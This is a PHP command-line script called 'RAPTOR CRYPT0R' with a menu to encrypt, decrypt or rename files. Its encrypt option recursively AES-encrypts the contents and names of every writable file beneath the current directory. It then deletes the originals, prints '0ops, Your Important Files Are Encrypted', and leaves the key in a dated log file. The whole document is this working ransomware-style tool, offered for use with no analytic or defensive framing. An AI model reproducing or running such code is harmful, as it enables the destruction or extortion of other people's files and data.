<?php
ini_set("memory_limit", "-1");
set_time_limit(0);
error_reporting(E_ALL ^ E_WARNING);
date_default_timezone_set('Asia/Jakarta');
class raptor{

public function __construct(){
  print "\n\n\033[0;32m           ── ─────████████        \n";
  print "        ── ── ─ ──███▄███████        \n";
  print "           ─ ─ ── ███████████        \n";
  print "          ────────███████████        \n";
  print "        ── ── ─ ──██████             \n";
  print "                  █████████          \n";
  print "        █───────███████              \n";
  print "        ██────████████████           \n";
  print "        ███──██████████──█           \n";
  print "        ███████████████              \n";
  print "        ███████████████  [RAPTOR]    \n";
  print "        ─█████████████   [CRYPT0R]   \n";
  print "        ──███████████                \n";
  print "            ████████                 \n";
  print "        ──  ─███──██                 \n";
  print "          ─ ─██─ ─-█                 \n";
  print "        ─────█─ ─ -█                 \n";
  print "        ─   ─██─ ─ ██                \033[0m\n";
  print "\n\033[1;33m       1) ENCRYPT ALL FILES         \n";
  print "       2) DECRYPT ALL FILES        \n";
  print "       3) CHANGE EXTENSION (ex:txt) TO EXTENSION (ex:html)       \033[0m\n";
  $author = "\n\n                               DEVELOPER : FADHEL MAR-V      \n\n";
  print $author;
  echo "       Choose: ";
  $choose = trim(fgets(STDIN, 1024));
if($choose == '3'){
  echo "       Extension: ";
  $extension = trim(fgets(STDIN, 1024));
  echo "       to: ";
  $to = trim(fgets(STDIN, 1024));
  foreach (glob(''."*."."$extension") as $filename) {
      if($filename != 'raptor.php'){
        $file = realpath($filename);
        rename($file, str_replace("$extension", "$to", $file));
        print "       -=======- YOUR FILE EXTENSION HAS BEEN CHANGED!!! -=======-         \n";
      }

  }
  print $author;

}
elseif($choose == '1'){

  $g = $this->randomkey();
  $_logfilename = "log_".date("Y-m-d").".txt";
  if(isset($g) && isset($_logfilename)){
  echo "\n";
  $this->rapenc('',$g);
    //ini log untuk kunci
  $this->logfile($_logfilename,$g);
    print "\n       Your key is ".$g;
  print $author;
  }
}
elseif($choose == '2'){

    echo "       Input Your Key : ";
    $key = trim(fgets(STDIN, 1024));

    echo "\n";
    $this->rapdec('',$key);
    print "\n\n       HAVE A NICE DAY :)         \n";
}else{
  print "       TIDAK ADA DALAM MENU         \n";
}
}

//1
public function randomkey() {
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomkey = '';
for ($i = 0; $i < 20; $i++) {
$randomkey .= $characters[rand(0, $charactersLength - 1)];
}
return $randomkey;
}

public function rapenc($ex,$g){
 foreach (glob($ex."*") as $filename) {
   if ($filename!='.' && $filename!='..') {
     # code...

   if (!is_dir($filename)) {
     if (!preg_match('/log_[0-9]{4}-[0-9]{2}-[0-9]{2}.txt/',$filename) && !preg_match('/raptor.php/',$filename) && is_writable($filename)) {
     $file = realpath($filename);
       $c0de = base64_encode(openssl_encrypt(pathinfo($filename, PATHINFO_FILENAME), "AES-256-CBC", hash('sha256', "$g"), 0, substr(hash('sha256', "$g"), 0, 16)));
       $enc0de = base64_encode(openssl_encrypt(file_get_contents($filename), "AES-256-CBC", hash('sha256', "$g"), 0, substr(hash('sha256', "$g"), 0, 16)));
     $write =  fopen(str_replace("$filename", "$filename.$c0de", $file), "w");
     if($write){
       fwrite($write, $enc0de);
       fclose($write);
       unlink($filename);
     }
     print "       -=======- 0ops, Your Important Files Are \033[1;32mEncrypted\033[0m!!! -=======-       \n";

   }elseif(!is_writable($filename)){
     return print "       -=======- \033[1;31mFAILED\033[0m!!!(NOT WRITABLE) -=======-         \n";
   }
   }else {
     $this->rapenc($filename.DIRECTORY_SEPARATOR,$g);
   }
}
}
}


//2

  public function rapdec($ex,$key){
     foreach (glob($ex."*") as $filename) {
       if ($filename!='.' && $filename!='..') {
       if (!is_dir($filename)) {
         if (!preg_match('/log_[0-9]{4}-[0-9]{2}-[0-9]{2}.txt/',$filename) && !preg_match('/raptor.php/',$filename) && is_writable($filename)) {
             $file = realpath($filename);
             $namedec = openssl_decrypt(base64_decode(pathinfo($filename, PATHINFO_EXTENSION)), "AES-256-CBC", hash('sha256', "$key"), 0, substr(hash('sha256', "$key"), 0, 16));
               $c0des = explode(".".pathinfo($filename, PATHINFO_EXTENSION),$filename);
               $dec0de = openssl_decrypt(base64_decode(file_get_contents($filename)), "AES-256-CBC", hash('sha256', "$key"), 0, substr(hash('sha256', "$key"), 0, 16));

             if($namedec == true){
               $write =  fopen(str_replace("$filename", $c0des[0], $file), "w");
             if($write){
               fwrite($write, $dec0de);
               fclose($write);
               unlink($filename);
               print "       -=======- 0kay, Your Files Are \033[1;32mDecrypted\033[0m!!!! -=======-         \n";
             }
           }else{

                       return print "       -=======- 00ps,Your key is \033[1;31mwrong\033[0m!!! -=======-         \n\n       ";
             }


       }elseif(!is_writable($filename)){
         return print "       -=======- \033[1;31mFAILED\033[0m!!!(NOT WRITABLE) -=======-         \n";
       }
       }else {
         $this->rapdec($filename.DIRECTORY_SEPARATOR,$key);
       }

 }
 }
 }


public function logfile($_logfilename,$g){
  // file log kunci
  if(!file_exists($_logfilename)){
      $_logfilehandler = fopen($_logfilename,'w');
      fwrite($_logfilehandler, date('Y-m-d H:i:s (e)')." – Key:".$g."\n");
      fclose($_logfilehandler);
  }else{
      $_logfilehandler = fopen($_logfilename,'a');
  }

  fwrite($_logfilehandler,date('Y-m-d H:i:s (e)')." – Key:".$g."\n");
  fclose($_logfilehandler);
}



}
new raptor();
